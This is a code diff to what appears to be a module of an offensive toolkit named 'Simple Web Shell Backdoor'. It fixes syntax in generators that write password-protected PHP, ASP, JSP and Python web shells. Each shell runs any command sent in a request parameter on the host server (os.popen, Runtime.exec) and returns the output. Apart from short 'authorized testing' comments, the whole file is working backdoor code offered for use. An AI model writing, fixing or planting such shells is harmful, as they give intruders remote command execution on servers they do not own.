@@ -1,5 +1,5 @@
 """
-Simple Web Shell Backdoor - FIXED SYNTAX
+Simple Web Shell Backdoor - FIXED Line 133
 """
 
 MODULE_INFO = {
@@ -9,7 +9,7 @@ MODULE_INFO = {
 OPTIONS = {
     "type": {
         "type": "choice",
-        "description": "Web shell type",
+        "description": "Web shell",
         "required": True,
         "choices": ["php", "asp", "jsp", "python"],
         "default": "php"
@@ -30,7 +30,7 @@ OPTIONS = {
 
 def generate_php_shell(password):
     """Generate PHP web shell"""
-    return f'''<?php
+    shell_code = f"""<?php
 // Simple PHP Web Shell - For authorized testing only
 error_reporting(0);
 $pass = "{password}";
@@ -58,24 +58,24 @@ if(isset($_FILES['file']) && isset($_POST['p']) && $_POST['p'] == $pass) {{
 }}
 
 // Simple login form
-echo '
-<html>
+echo '<html>
 <body>
 <form method="post">
 Password: <input type="password" name="p">
 <input type="submit" value="Login">
 </form>
 </body>
-</html>
-';
+</html>';
 ?>
-'''
+"""
+    return shell_code
 
 def generate_asp_shell(password):
     """Generate ASP web shell"""
-    return f'''<%
+    shell_code = f"""<%
 ' ASP Web Shell - For authorized testing only
-Dim pass: pass = "{password}"
+Dim pass
+pass = "{password}"
 Dim cmd
 
 If Request.QueryString("p") = pass Then
@@ -106,31 +106,34 @@ Command: <input type="text" name="cmd">
 </form>
 </body>
 </html>
-'''
+"""
+    return shell_code
 
-def generate_python_shell():
-    """Generate Python web shell (for frameworks)"""
-    return '''#!/usr/bin/env python3
+def generate_python_shell(password):
+    """Generate Python web shell"""
+    shell_code = f"""#!/usr/bin/env python3
 # Python Web Shell - Use with caution
-import os, sys, cgi
+import os
+import cgi
+import cgitb
+cgitb.enable()
 
 print("Content-type: text/html\\n\\n")
 
 form = cgi.FieldStorage()
-password = "pass123"
+passwd = "{password}"
 cmd = form.getvalue('cmd', '')
 p = form.getvalue('p', '')
 
-if p == password and cmd:
-    print(f"<pre>Executing: {cmd}</pre>")
+if p == passwd and cmd:
+    print("<pre>Executing: " + cmd + "</pre>")
     try:
         result = os.popen(cmd).read()
-        print(f"<pre>{result}</pre>")
+        print("<pre>" + result + "</pre>")
     except Exception as e:
-        print(f"<pre>Error: {e}</pre>")
+        print("<pre>Error: " + str(e) + "</pre>")
 
-print('''
-<html>
+print('''<html>
 <body>
 <form method="post">
 Password: <input type="password" name="p"><br>
@@ -138,13 +141,13 @@ Command: <input type="text" name="cmd" size="50"><br>
 <input type="submit" value="Execute">
 </form>
 </body>
-</html>
-''')
-'''
+</html>''')
+"""
+    return shell_code
 
 def generate_jsp_shell(password):
     """Generate JSP web shell"""
-    return f'''<%@ page import="java.util.*,java.io.*" %>
+    shell_code = f"""<%@ page import="java.util.*,java.io.*" %>
 <%
 // JSP Web Shell - For authorized testing only
 String pass = "{password}";
@@ -153,8 +156,8 @@ String p = request.getParameter("p");
 if (pass.equals(p)) {{
     String cmd = request.getParameter("cmd");
     if (cmd != null) {{
-        Process p = Runtime.getRuntime().exec(cmd);
-        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        Process proc = Runtime.getRuntime().exec(cmd);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
         String s;
         out.print("<pre>");
         while ((s = stdInput.readLine()) != null) {{
@@ -174,7 +177,8 @@ Command: <input type="text" name="cmd">
 </form>
 </body>
 </html>
-'''
+"""
+    return shell_code
 
 def run(session, options):
     shell_type = options.get("type", "php")
@@ -198,7 +202,7 @@ def run(session, options):
     elif shell_type == "jsp":
         content = generate_jsp_shell(password)
     elif shell_type == "python":
-        content = generate_python_shell()
+        content = generate_python_shell(password)
     else:
         content = generate_php_shell(password)  # Default
     
